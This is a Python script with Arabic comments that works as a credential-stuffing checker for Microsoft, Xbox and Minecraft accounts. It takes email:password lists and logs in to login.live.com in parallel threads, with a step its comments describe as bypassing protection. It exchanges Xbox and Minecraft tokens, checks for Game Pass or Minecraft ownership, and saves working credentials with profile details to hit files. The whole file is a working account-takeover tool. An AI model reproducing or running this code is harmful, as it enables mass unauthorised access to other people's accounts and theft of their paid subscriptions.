import re
import time
import threading
import concurrent.futures
import os
import json
import logging
from datetime import datetime
from urllib.parse import urlparse, parse_qs

try:
    import requests
    import urllib3
    from colorama import Fore, Style, init
except ImportError:
    print("⚠️ يرجى تثبيت المكتبات: pip install requests colorama urllib3")
    exit(1)

# إعدادات
urllib3.disable_warnings()
SFTAG_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)
MAX_RETRIES = 3
REQUEST_TIMEOUT = 15
THREAD_COUNT = 10  # لتجنب الحظر

# إعدادات السجلات
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ============================================================
# 📊 الإحصائيات (موضوعية وآمنة للخيوط)
# ============================================================
class Stats:
    def __init__(self):
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.twofa = 0
        self.errors = 0
        self.minecraft = 0
        self.gamepass = 0
        self.xbox = 0
        self.not_linked = 0
        self.retries = 0
        self.start_time = time.time()
        self._lock = threading.Lock()
        self._local = threading.local()

    def set_email(self, email):
        self._local.current_email = email

    def get_email(self):
        return getattr(self._local, 'current_email', '')

stats = Stats()

# ============================================================
# 📁 إدارة النتائج
# ============================================================
RESULTS_DIR = "Results"
os.makedirs(RESULTS_DIR, exist_ok=True)
FILE_MAP = {
    "minecraft": os.path.join(RESULTS_DIR, "minecraft_hits.txt"),
    "gamepass": os.path.join(RESULTS_DIR, "gamepass_hits.txt"),
    "xbox": os.path.join(RESULTS_DIR, "xbox_hits.txt"),
    "not_linked": os.path.join(RESULTS_DIR, "not_linked.txt"),
    "twofa": os.path.join(RESULTS_DIR, "2fa.txt"),
}
file_lock = threading.Lock()

def save_hit(category, content):
    path = FILE_MAP.get(category)
    if not path: return
    with file_lock:
        try:
            with open(path, 'a', encoding='utf-8') as f:
                f.write(content + '\n')
        except Exception as e:
            logger.error(f"Save error: {e}")

# ============================================================
# 🔐 دوال المصادقة والفحص
# ============================================================
def get_sftag(session):
    for attempt in range(MAX_RETRIES):
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            response = session.get(SFTAG_URL, headers=headers, timeout=REQUEST_TIMEOUT)
            text = response.text
            # محاولة استخراج sFTTag و urlPost
            ppft = None
            url_post = None
            # البحث عن JSON
            json_match = re.search(r'<script[^>]*id="[^"]*"[^>]*>var\s+config\s*=\s*({.*?});</script>', text, re.DOTALL)
            if json_match:
                try:
                    config = json.loads(json_match.group(1))
                    ppft = config.get('sFTTag') or config.get('ppft')
                    url_post = config.get('urlPost')
                except: pass
            if not ppft:
                m = re.search(r'name="PPFT"\s+value="([^"]+)"', text, re.I)
                if m: ppft = m.group(1)
            if not url_post:
                m = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', text, re.I)
                if m: url_post = m.group(1)
            if ppft and url_post:
                return url_post, ppft
        except: pass
        time.sleep(0.5)
    return None, None

def microsoft_auth(session, email, password, url_post, sftag):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://login.live.com',
        'Referer': SFTAG_URL,
    }
    data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
    for attempt in range(MAX_RETRIES):
        try:
            r = session.post(url_post, data=data, headers=headers, allow_redirects=True, timeout=REQUEST_TIMEOUT)
            text_lower = r.text.lower()
            if any(x in text_lower for x in ['twofactor', '2fa', 'verification', 'security code']):
                return None, "2fa"
            if any(x in text_lower for x in ['password is incorrect', "account doesn't exist", "incorrect password"]):
                return None, "bad"
            if '#' in r.url and r.url != SFTAG_URL:
                token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
                if token and token != "None":
                    return token, "success"
            # حالة Cancel (تجاوز الحماية)
            if 'cancel?mkt=' in r.text:
                try:
                    ipt = re.search(r'name="ipt"\s+value="([^"]+)"', r.text)
                    pprid = re.search(r'name="pprid"\s+value="([^"]+)"', r.text)
                    uaid = re.search(r'name="uaid"\s+value="([^"]+)"', r.text)
                    action = re.search(r'<form[^>]+action="([^"]+)"', r.text)
                    if ipt and pprid and uaid and action:
                        d = {'ipt': ipt.group(1), 'pprid': pprid.group(1), 'uaid': uaid.group(1)}
                        ret = session.post(action.group(1), data=d, allow_redirects=True)
                        token = parse_qs(urlparse(ret.url).fragment).get('access_token', [None])[0]
                        if token and token != "None": return token, "success"
                except: pass
        except Exception as e:
            logger.debug(f"Auth attempt {attempt+1}: {e}")
        time.sleep(0.5)
    return None, "error"

def get_xbox_token(session, ms_token):
    for attempt in range(MAX_RETRIES):
        try:
            payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
                       "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
            r = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload,
                             headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT)
            if r.status_code == 200:
                data = r.json()
                return data.get('Token'), data['DisplayClaims']['xui'][0]['uhs']
            elif r.status_code == 429:
                time.sleep(2)
        except: pass
        time.sleep(0.5)
    return None, None

def get_xsts_token(session, xbox_token):
    for attempt in range(MAX_RETRIES):
        try:
            payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                       "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
            r = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload,
                             headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT)
            if r.status_code == 200:
                return r.json().get('Token')
            elif r.status_code == 429:
                time.sleep(2)
        except: pass
        time.sleep(0.5)
    return None

def get_minecraft_token(session, uhs, xsts_token):
    for attempt in range(MAX_RETRIES):
        try:
            r = session.post('https://api.minecraftservices.com/authentication/login_with_xbox',
                             json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
                             headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT)
            if r.status_code == 200:
                return r.json().get('access_token')
            elif r.status_code == 429:
                time.sleep(2)
        except: pass
        time.sleep(0.5)
    return None

def check_entitlements(session, mc_token):
    for attempt in range(MAX_RETRIES):
        try:
            r = session.get('https://api.minecraftservices.com/entitlements/mcstore',
                            headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
            if r.status_code == 200:
                data = r.json()
                names = [e.get('name', '').lower() for e in data.get('entitlements', [])]
                if 'product_game_pass_ultimate' in names: return 'Xbox Game Pass Ultimate', ["Ultimate"]
                if 'product_game_pass_pc' in names: return 'Xbox Game Pass', ["Game Pass"]
                if 'product_minecraft' in names: return 'Minecraft', ["Minecraft Java"]
                return None, []
            elif r.status_code == 429:
                time.sleep(2)
        except: pass
        time.sleep(0.5)
    return None, []

def get_profile(session, mc_token):
    for attempt in range(MAX_RETRIES):
        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile',
                            headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
            if r.status_code == 200: return r.json()
            elif r.status_code == 404: return None
        except: pass
        time.sleep(0.5)
    return None

def get_xbox_profile(session, uhs, xsts_token):
    for attempt in range(MAX_RETRIES):
        try:
            auth = f"XBL3.0 x={uhs};{xsts_token}"
            r = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag",
                            headers={"Authorization": auth, "x-xbl-contract-version": "2"}, timeout=REQUEST_TIMEOUT)
            if r.status_code == 200:
                data = r.json()
                settings = {s["id"]: s.get("value", "N/A") for s in data.get("profileUsers", [{}])[0].get("settings", [])}
                return {"gamertag": settings.get("Gamertag", "N/A")}
            elif r.status_code == 429:
                time.sleep(2)
        except: pass
        time.sleep(0.5)
    return {"gamertag": "N/A"}

# ============================================================
# 🧠 دالة فحص الحساب الواحد
# ============================================================
def check_account(combo):
    try:
        parts = combo.strip().split(':')
        if len(parts) < 2:
            with stats._lock: stats.bad += 1; stats.checked += 1
            return
        email, password = parts[0], ':'.join(parts[1:])
        stats.set_email(email)

        session = requests.Session()
        session.verify = False  # لتجنب مشاكل الشهادات في بعض البيئات (استخدام للاختبار فقط)

        url_post, sftag = get_sftag(session)
        if not url_post or not sftag:
            with stats._lock: stats.errors += 1; stats.checked += 1
            return

        ms_token, status = microsoft_auth(session, email, password, url_post, sftag)
        if status == "2fa":
            with stats._lock: stats.twofa += 1; stats.checked += 1
            save_hit("twofa", f"{email}:{password}")
            return
        if status == "bad" or not ms_token:
            with stats._lock: stats.bad += 1; stats.checked += 1
            return

        xbox_token, uhs = get_xbox_token(session, ms_token)
        if not xbox_token or not uhs:
            with stats._lock: stats.bad += 1; stats.checked += 1
            return

        xsts_token = get_xsts_token(session, xbox_token)
        if not xsts_token:
            with stats._lock: stats.bad += 1; stats.checked += 1
            return

        gamertag = get_xbox_profile(session, uhs, xsts_token).get("gamertag", "N/A")
        mc_token = get_minecraft_token(session, uhs, xsts_token)
        if not mc_token:
            with stats._lock: stats.bad += 1; stats.checked += 1
            return

        acc_type, subs = check_entitlements(session, mc_token)
        if not acc_type:
            with stats._lock: stats.not_linked += 1; stats.hits += 1; stats.checked += 1
            save_hit("not_linked", f"{email}:{password} | Gamertag: {gamertag}")
            return

        profile = get_profile(session, mc_token)
        name = profile.get('name', 'N/A') if profile else "Not Set"
        uuid = profile.get('id', 'N/A') if profile else "N/A"
        capes = ", ".join([c["alias"] for c in profile.get("capes", [])]) if profile else "None"

        capture = (f"Email: {email}\nPassword: {password}\nGamertag: {gamertag}\nMC Name: {name}\nUUID: {uuid}\nCapes: {capes}\nType: {acc_type}\nSubs: {', '.join(subs) if subs else 'None'}\n{'='*40}")

        if 'Ultimate' in acc_type or 'Game Pass' in acc_type:
            with stats._lock: stats.gamepass += 1
            save_hit("gamepass", capture)
        elif 'Minecraft' in acc_type:
            with stats._lock: stats.minecraft += 1
            save_hit("minecraft", capture)
        else:
            with stats._lock: stats.xbox += 1
            save_hit("xbox", capture)

        with stats._lock: stats.hits += 1; stats.checked += 1

    except Exception as e:
        logger.error(f"Error: {e}")
        with stats._lock: stats.errors += 1; stats.checked += 1

# ============================================================
# 🚀 تشغيل الفحص على قائمة كاملة
# ============================================================
def run_check(combos_list):
    """تشغيل الفحص على قائمة الكومبوهات"""
    if not combos_list:
        logger.error("لا توجد كومبوهات للفحص")
        return

    total = len(combos_list)
    logger.info(f"بدء فحص {total} حساب...")

    # إعادة ضبط الإحصائيات
    with stats._lock:
        stats.checked = stats.hits = stats.bad = stats.twofa = stats.errors = stats.minecraft = stats.gamepass = stats.xbox = stats.not_linked = stats.retries = 0
        stats.start_time = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        futures = {executor.submit(check_account, c): c for c in combos_list}
        for future in concurrent.futures.as_completed(futures):
            pass

    logger.info("✅ انتهى الفحص!")
